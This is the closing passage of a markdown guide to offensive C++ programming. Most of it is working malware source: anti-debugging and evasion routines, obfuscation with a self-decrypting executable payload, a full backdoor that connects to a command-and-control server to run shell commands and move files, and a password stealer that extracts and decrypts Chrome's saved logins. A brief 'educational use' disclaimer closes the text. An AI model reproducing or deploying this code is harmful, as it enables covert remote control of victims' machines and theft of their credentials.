        return IsDebuggerPresent();
    }
    
    static bool check_remote_debugger() {
        BOOL is_debugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_debugged);
        return is_debugged;
    }
    
    static bool check_debug_heap() {
        DWORD heap_flags = *(DWORD*)((BYTE*)GetProcessHeap() + 0x40);
        DWORD heap_force_flags = *(DWORD*)((BYTE*)GetProcessHeap() + 0x44);
        
        return (heap_flags & 0x2) || (heap_force_flags & 0x40000060);
    }
    
    static bool check_debug_port() {
        HANDLE debug_port = nullptr;
        NTSTATUS status = NtQueryInformationProcess(
            GetCurrentProcess(),
            ProcessDebugPort,
            &debug_port,
            sizeof(debug_port),
            nullptr
        );
        
        return (status == 0 && debug_port != nullptr);
    }
    
    static bool timing_check() {
        DWORD start = GetTickCount();
        
        // Some dummy operations
        for (int i = 0; i < 1000; i++) {
            volatile int x = i * 2;
        }
        
        DWORD end = GetTickCount();
        return (end - start) > 100; // Debugger overhead
    }
    
    static void anti_debug_loop() {
        while (true) {
            if (is_debugger_present_api() ||
                check_remote_debugger() ||
                check_debug_heap() ||
                check_debug_port() ||
                timing_check()) {
                
                // Detected debugger - take evasive action
                exit_process_stealthily();
            }
            
            Sleep(1000);
        }
    }
    
private:
    static void exit_process_stealthily() {
        // Clear memory before exit
        secure_zero_memory();
        
        // Exit without calling destructors
        TerminateProcess(GetCurrentProcess(), 0);
    }
    
    static void secure_zero_memory() {
        // Zero out sensitive memory regions
        MEMORY_BASIC_INFORMATION mbi;
        BYTE* address = nullptr;
        
        while (VirtualQuery(address, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && mbi.Protect & PAGE_READWRITE) {
                SecureZeroMemory(mbi.BaseAddress, mbi.RegionSize);
            }
            address = static_cast<BYTE*>(mbi.BaseAddress) + mbi.RegionSize;
        }
    }
};
#endif
```

### 2. Code Obfuscation Techniques

```cpp
class CodeObfuscator {
public:
    // Simple XOR string obfuscation
    template<size_t N>
    struct ObfuscatedString {
        char data[N];
        
        constexpr ObfuscatedString(const char (&str)[N]) {
            for (size_t i = 0; i < N; ++i) {
                data[i] = str[i] ^ 0xAA; // XOR key
            }
        }
        
        std::string decrypt() const {
            std::string result(N - 1, '\0');
            for (size_t i = 0; i < N - 1; ++i) {
                result[i] = data[i] ^ 0xAA;
            }
            return result;
        }
    };
    
    // Control flow obfuscation
    template<typename T>
    static T obfuscated_add(T a, T b) {
        // Use opaque predicate to confuse static analysis
        if ((a * b) * 0 == 0) {
            return a + b;
        } else {
            // Dead code that never executes
            return a - b;
        }
    }
    
    // Dummy function calls to confuse analysis
    static void insert_noise() {
        volatile int dummy = 0;
        for (int i = 0; i < 100; ++i) {
            dummy += rand();
            if (dummy % 1000000 == 123456) {
                // Unlikely branch - but analyzer doesn't know that
                system("echo noise");
            }
        }
    }
    
    // Self-modifying code example
    static void self_modify_and_execute() {
        // Allocate executable memory
        void* mem = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return;
        
        // Original encrypted payload
        uint8_t encrypted_payload[] = {
            0x89, 0xE5, 0x31, 0xC0, 0xC3  // XORed with 0x55
        };
        
        // Decrypt and write to executable memory
        for (size_t i = 0; i < sizeof(encrypted_payload); ++i) {
            static_cast<uint8_t*>(mem)[i] = encrypted_payload[i] ^ 0x55;
        }
        
        // Execute decrypted code
        typedef void (*func_ptr)();
        func_ptr decrypted_func = reinterpret_cast<func_ptr>(mem);
        decrypted_func();
        
        // Clean up
        VirtualFree(mem, 0, MEM_RELEASE);
    }
};

// Macro for easy string obfuscation
#define OBFUSCATED_STRING(str) []() { \
    static constexpr auto obf = CodeObfuscator::ObfuscatedString(str); \
    return obf.decrypt(); \
}()
```

---

## Practical Examples

### 1. Simple Backdoor

```cpp
#include <thread>
#include <chrono>

class SimpleBackdoor {
private:
    std::string c2_server;
    int c2_port;
    bool running;
    std::thread worker_thread;
    
public:
    SimpleBackdoor(const std::string& server, int port) 
        : c2_server(server), c2_port(port), running(false) {}
    
    void start() {
        running = true;
        worker_thread = std::thread(&SimpleBackdoor::main_loop, this);
    }
    
    void stop() {
        running = false;
        if (worker_thread.joinable()) {
            worker_thread.join();
        }
    }
    
private:
    void main_loop() {
        while (running) {
            try {
                connect_to_c2();
                std::this_thread::sleep_for(std::chrono::minutes(5));
            } catch (const std::exception& e) {
                // Log error and continue
                std::this_thread::sleep_for(std::chrono::minutes(1));
            }
        }
    }
    
    void connect_to_c2() {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return;
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(c2_port);
        inet_pton(AF_INET, c2_server.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            handle_commands(sock);
        }
        
        close(sock);
    }
    
    void handle_commands(int sock) {
        char buffer[4096];
        
        while (running) {
            int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) break;
            
            buffer[bytes_received] = '\0';
            std::string command(buffer);
            
            std::string response = execute_command(command);
            send(sock, response.c_str(), response.length(), 0);
        }
    }
    
    std::string execute_command(const std::string& command) {
        if (command.substr(0, 3) == "cmd") {
            return execute_shell_command(command.substr(4));
        } else if (command.substr(0, 8) == "download") {
            return download_file(command.substr(9));
        } else if (command.substr(0, 6) == "upload") {
            return upload_file(command.substr(7));
        } else if (command == "sysinfo") {
            return get_system_info();
        }
        
        return "Unknown command";
    }
    
    std::string execute_shell_command(const std::string& cmd) {
        std::string result;
        FILE* pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buffer[128];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            pclose(pipe);
        }
        return result;
    }
    
    std::string download_file(const std::string& filepath) {
        std::ifstream file(filepath, std::ios::binary);
        if (!file) return "File not found";
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        return "FILE:" + content;
    }
    
    std::string upload_file(const std::string& data) {
        // Parse filename and content from data
        size_t delimiter = data.find('|');
        if (delimiter == std::string::npos) return "Invalid format";
        
        std::string filename = data.substr(0, delimiter);
        std::string content = data.substr(delimiter + 1);
        
        std::ofstream file(filename, std::ios::binary);
        if (!file) return "Cannot create file";
        
        file.write(content.c_str(), content.length());
        return "File uploaded successfully";
    }
    
    std::string get_system_info() {
        std::ostringstream info;
        
#ifdef _WIN32
        SYSTEM_INFO sys_info;
        GetSystemInfo(&sys_info);
        
        char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computer_name);
        GetComputerNameA(computer_name, &size);
        
        info << "OS: Windows\n";
        info << "Computer: " << computer_name << "\n";
        info << "Processors: " << sys_info.dwNumberOfProcessors << "\n";
#else
        struct utsname sys_info;
        uname(&sys_info);
        
        info << "OS: " << sys_info.sysname << "\n";
        info << "Hostname: " << sys_info.nodename << "\n";
        info << "Kernel: " << sys_info.release << "\n";
#endif
        
        return info.str();
    }
};
```

### 2. Password Stealer

```cpp
class PasswordStealer {
public:
    struct StoredPassword {
        std::string application;
        std::string username;
        std::string password;
        std::string url;
    };
    
    static std::vector<StoredPassword> steal_browser_passwords() {
        std::vector<StoredPassword> passwords;
        
#ifdef _WIN32
        // Chrome passwords
        auto chrome_passwords = extract_chrome_passwords();
        passwords.insert(passwords.end(), chrome_passwords.begin(), chrome_passwords.end());
        
        // Firefox passwords
        auto firefox_passwords = extract_firefox_passwords();
        passwords.insert(passwords.end(), firefox_passwords.begin(), firefox_passwords.end());
        
        // Edge passwords
        auto edge_passwords = extract_edge_passwords();
        passwords.insert(passwords.end(), edge_passwords.begin(), edge_passwords.end());
#endif
        
        return passwords;
    }
    
private:
#ifdef _WIN32
    static std::vector<StoredPassword> extract_chrome_passwords() {
        std::vector<StoredPassword> passwords;
        
        char* appdata;
        size_t len;
        _dupenv_s(&appdata, &len, "LOCALAPPDATA");
        
        if (appdata) {
            std::string chrome_path = std::string(appdata) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
            free(appdata);
            
            // Copy database to temporary location (Chrome locks the original)
            std::string temp_path = std::tmpnam(nullptr);
            if (CopyFileA(chrome_path.c_str(), temp_path.c_str(), FALSE)) {
                passwords = parse_chrome_database(temp_path);
                DeleteFileA(temp_path.c_str());
            }
        }
        
        return passwords;
    }
    
    static std::vector<StoredPassword> parse_chrome_database(const std::string& db_path) {
        std::vector<StoredPassword> passwords;
        
        // Note: In real implementation, would use SQLite API
        // This is a simplified example
        
        sqlite3* db;
        if (sqlite3_open(db_path.c_str(), &db) == SQLITE_OK) {
            const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
            sqlite3_stmt* stmt;
            
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    StoredPassword pwd;
                    pwd.application = "Chrome";
                    pwd.url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    pwd.username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    
                    // Decrypt password (Chrome uses DPAPI on Windows)
                    const void* encrypted_password = sqlite3_column_blob(stmt, 2);
                    int password_len = sqlite3_column_bytes(stmt, 2);
                    pwd.password = decrypt_chrome_password(encrypted_password, password_len);
                    
                    passwords.push_back(pwd);
                }
            }
            
            sqlite3_finalize(stmt);
            sqlite3_close(db);
        }
        
        return passwords;
    }
    
    static std::string decrypt_chrome_password(const void* encrypted_data, int data_len) {
        DATA_BLOB encrypted_blob;
        encrypted_blob.pbData = static_cast<BYTE*>(const_cast<void*>(encrypted_data));
        encrypted_blob.cbData = data_len;
        
        DATA_BLOB decrypted_blob;
        if (CryptUnprotectData(&encrypted_blob, nullptr, nullptr, nullptr, nullptr, 0, &decrypted_blob)) {
            std::string password(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
            LocalFree(decrypted_blob.pbData);
            return password;
        }
        
        return "";
    }
    
    static std::vector<StoredPassword> extract_firefox_passwords() {
        // Firefox implementation would be similar but uses different encryption
        return {};
    }
    
    static std::vector<StoredPassword> extract_edge_passwords() {
        // Edge implementation (similar to Chrome as it's Chromium-based)
        return {};
    }
#endif
};
```

---

## Resources & References

### Essential Libraries

```cpp
// Networking
#include <curl/curl.h>        // HTTP/HTTPS requests
#include <openssl/ssl.h>      // SSL/TLS operations

// Cryptography
#include <openssl/evp.h>      // EVP interface
#include <openssl/aes.h>      // AES encryption
#include <openssl/rsa.h>      // RSA encryption
#include <openssl/sha.h>      // SHA hashing

// System Programming
#ifdef _WIN32
#include <windows.h>          // Windows API
#include <winsock2.h>         // Windows sockets
#include <psapi.h>            // Process API
#include <tlhelp32.h>         // Tool help library
#else
#include <unistd.h>           // UNIX standard
#include <sys/ptrace.h>       // Process tracing
#include <sys/socket.h>       // Unix sockets
#include <netinet/in.h>       // Internet addresses
#endif

// Database
#include <sqlite3.h>          // SQLite database

// JSON/XML Processing
#include <nlohmann/json.hpp>  // JSON for Modern C++
#include <tinyxml2.h>         // XML parsing
```

### Build Configuration

```cmake
# CMakeLists.txt for Security Tools
cmake_minimum_required(VERSION 3.12)
project(SecurityTools)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Security-specific compiler flags
if(MSVC)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /GS /sdl")  # Buffer security check, SDL checks
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /NXCOMPAT /DYNAMICBASE")
else()
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -fstack-protector-strong -D_FORTIFY_SOURCE=2")
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -Wl,-z,relro,-z,now")
endif()

# Find required libraries
find_package(OpenSSL REQUIRED)
find_package(PkgConfig REQUIRED)
pkg_check_modules(SQLITE3 REQUIRED sqlite3)

# Include directories
include_directories(${OPENSSL_INCLUDE_DIR})

# Link libraries
target_link_libraries(SecurityTools 
    ${OPENSSL_LIBRARIES}
    ${SQLITE3_LIBRARIES}
)

# Platform-specific libraries
if(WIN32)
    target_link_libraries(SecurityTools ws2_32 crypt32 advapi32)
else()
    target_link_libraries(SecurityTools pthread)
endif()
```

### Security Best Practices

1. **Memory Safety**
   - Use smart pointers (`std::unique_ptr`, `std::shared_ptr`)
   - Avoid raw arrays, use `std::vector` or `std::array`
   - Clear sensitive data from memory after use

2. **Input Validation**
   - Validate all external inputs
   - Use safe string functions (`std::string` over `char*`)
   - Implement bounds checking

3. **Cryptography**
   - Use established libraries (OpenSSL, Crypto++)
   - Never implement custom crypto algorithms
   - Use proper random number generation

4. **Compilation Security**
   - Enable stack protection (`-fstack-protector-strong`)
   - Use Address Space Layout Randomization (ASLR)
   - Enable Control Flow Integrity when available

### Learning Resources

- **Books:**
  - "Hacking: The Art of Exploitation" by Jon Erickson
  - "The Shellcoder's Handbook" by Chris Anley
  - "Windows Internals" by Mark Russinovich

- **Online Courses:**
  - Offensive Security Certified Professional (OSCP)
  - SANS SEC660: Advanced Penetration Testing

- **Practice Platforms:**
  - HackTheBox
  - TryHackMe
  - OverTheWire
  - pwnable.kr

---

## Disclaimer

This guide is intended for **educational purposes** and **authorized security testing** only. The techniques and code examples provided should only be used on systems you own or have explicit written permission to test.

**⚠️ Legal Notice:**
- Unauthorized access to computer systems is illegal
- Always obtain proper authorization before testing
- Follow responsible disclosure practices
- Respect privacy and data protection laws
- Use this knowledge to improve security, not to cause harm

**🛡️ Ethical Guidelines:**
- Only test on systems you own or have permission to test
- Document all findings and provide remediation guidance
- Follow your organization's security policies
- Maintain confidentiality of discovered vulnerabilities
- Contribute to the security community responsibly

---

**Author:** c0d3Ninja  
**License:** Educational Use Only  
**Last Updated:** 2025

*"With great power comes great responsibility. Use these techniques to build a more secure digital world."*
